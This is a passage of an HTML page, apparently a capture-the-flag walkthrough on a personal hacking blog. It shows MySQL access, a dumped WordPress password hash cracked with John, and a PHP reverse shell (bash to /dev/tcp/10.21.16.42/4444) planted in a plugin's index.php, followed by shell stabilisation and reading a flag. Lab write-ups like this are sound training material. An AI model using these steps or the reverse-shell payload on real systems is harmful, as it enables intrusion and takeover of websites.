+<span class="nt">Your</span><span class="w"> </span><span class="nt">MySQL</span><span class="w"> </span><span class="nt">connection</span><span class="w"> </span><span class="nt">id</span><span class="w"> </span><span class="nt">is</span><span class="w"> </span><span class="nt">55</span>
+<span class="nt">Server</span><span class="w"> </span><span class="nt">version</span><span class="o">:</span><span class="w"> </span><span class="nt">5</span><span class="p">.</span><span class="nc">7</span><span class="p">.</span><span class="nc">33-0ubuntu0</span><span class="p">.</span><span class="nc">16</span><span class="p">.</span><span class="nc">04</span><span class="p">.</span><span class="nc">1</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="o">)</span>
+
+<span class="nt">Copyright</span><span class="w"> </span><span class="o">(</span><span class="nt">c</span><span class="o">)</span><span class="w"> </span><span class="nt">2000</span><span class="o">,</span><span class="w"> </span><span class="nt">2018</span><span class="o">,</span><span class="w"> </span><span class="nt">Oracle</span><span class="o">,</span><span class="w"> </span><span class="nt">MariaDB</span><span class="w"> </span><span class="nt">Corporation</span><span class="w"> </span><span class="nt">Ab</span><span class="w"> </span><span class="nt">and</span><span class="w"> </span><span class="nt">others</span><span class="o">.</span>
+
+<span class="nt">Type</span><span class="w"> </span><span class="s1">&#39;help;&#39;</span><span class="w"> </span><span class="nt">or</span><span class="w"> </span><span class="s1">&#39;\h&#39;</span><span class="w"> </span><span class="nt">for</span><span class="w"> </span><span class="nt">help</span><span class="o">.</span><span class="w"> </span><span class="nt">Type</span><span class="w"> </span><span class="s1">&#39;\c&#39;</span><span class="w"> </span><span class="nt">to</span><span class="w"> </span><span class="nt">clear</span><span class="w"> </span><span class="nt">the</span><span class="w"> </span><span class="nt">current</span><span class="w"> </span><span class="nt">input</span><span class="w"> </span><span class="nt">statement</span><span class="o">.</span>
+</code></pre></div>
+
+<blockquote>
+<p>after login find hashes another user</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code>corp-001
+$P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1
+</code></pre></div>
+
+<blockquote>
+<p>so use John for crack hash</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code>john hash.txt
+Proceeding with wordlist:/usr/share/john/password.lst
+teddybear        (?)     
+</code></pre></div>
+
+<blockquote>
+<p>Found pwd so login as a new user and in plugin section add php reverse shell and get shell</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="nx">add</span><span class="w"> </span><span class="k">this</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">plugins</span><span class="w"> </span><span class="nx">index</span><span class="p">.</span><span class="nx">php</span><span class="w"> </span><span class="nx">section</span>
+
+<span class="cp">&lt;?php</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.21.16.42/4444 0&gt;&amp;1&#39;&quot;</span><span class="p">);</span>
+</code></pre></div>
+
+<blockquote>
+<p>after in reverse shell and to get stable shell</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="n">which</span><span class="w"> </span><span class="n">python3</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">akismet</span><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">ls</span>
+<span class="n">stux</span>
+<span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">stux</span>
+<span class="n">cd</span><span class="w"> </span><span class="n">stux</span>
+<span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">stux</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span>
+<span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span>
+<span class="n">total</span><span class="w"> </span><span class="mi">44</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">stux</span><span class="w"> </span><span class="n">stux</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">May</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="p">.</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">May</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="p">..</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-------</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">3359</span><span class="w"> </span><span class="n">May</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="p">.</span><span class="n">bash_history</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">stux</span><span class="w"> </span><span class="n">stux</span><span class="w">  </span><span class="mi">220</span><span class="w"> </span><span class="n">May</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="p">.</span><span class="n">bash_logout</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">stux</span><span class="w"> </span><span class="n">stux</span><span class="w"> </span><span class="mi">3771</span><span class="w"> </span><span class="n">May</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="p">.</span><span class="n">bashrc</span>
+<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">stux</span><span class="w"> </span><span class="n">stux</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">May</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="p">.</span><span class="n">cache</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-------</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">stux</span><span class="w"> </span><span class="n">stux</span><span class="w">  </span><span class="mi">131</span><span class="w"> </span><span class="n">May</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="p">.</span><span class="n">mysql_history</span>
+<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">stux</span><span class="w"> </span><span class="n">stux</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">May</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="p">.</span><span class="n">nano</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">stux</span><span class="w"> </span><span class="n">stux</span><span class="w">  </span><span class="mi">655</span><span class="w"> </span><span class="n">May</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="p">.</span><span class="n">profile</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">stux</span><span class="w"> </span><span class="n">stux</span><span class="w">    </span><span class="mi">0</span><span class="w"> </span><span class="n">May</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="p">.</span><span class="n">sudo_as_admin_successful</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">183</span><span class="w"> </span><span class="n">May</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="p">.</span><span class="n">wget</span><span class="o">-</span><span class="n">hsts</span>
+<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">stux</span><span class="w"> </span><span class="n">stux</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">May</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="n">flag</span>
+<span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">stux</span><span class="err">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">flag</span>
+<span class="n">cd</span><span class="w"> </span><span class="n">flag</span>
+<span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">stux</span><span class="o">/</span><span class="n">flag</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">ls</span>
+<span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">stux</span><span class="o">/</span><span class="n">flag</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">cat</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>
+
+<blockquote>
+<p>you can get that port like this</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="c">MySQL </span><span class="k">[</span><span class="c">information_schema</span><span class="k">]</span><span class="nv">&gt;</span><span class="c"> SHOW VARIABLES LIKE &#39;port&#39;;</span>
+<span class="nb">+---------------+-------+</span>
+<span class="c">| Variable_name | Value |</span>
+<span class="nb">+---------------+-------+</span>
+<span class="c">| port          | 3306  |</span>
+<span class="nb">+---------------+-------+</span>
+<span class="c">1 row in set (0</span><span class="nt">.</span><span class="c">366 sec)</span>
+
+<span class="c">MySQL </span><span class="k">[</span><span class="c">information_schema</span><span class="k">]</span><span class="nv">&gt;</span><span class="c"> </span>
+</code></pre></div>
+        </div>
+    </article>
+
+    <!-- Footer -->
+    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
+            <div class="diag-card text-left">
+                <span class="diag-label">Access_Level</span>
+                <span class="diag-value">OMNI_READ_ONLY</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Encryption</span>
+                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Signal_Strength</span>
+                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">System_Status</span>
+                <span class="diag-value">STABLE_HARDENED</span>
+            </div>
+        </div>
+
+        <div class="flex justify-center gap-6 mb-8">
+            <a href="https://github.com/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
+                    class="fa-brands fa-github"></i></a>
+            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
+                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
+            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
+                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
+                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
+        </div>
+        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
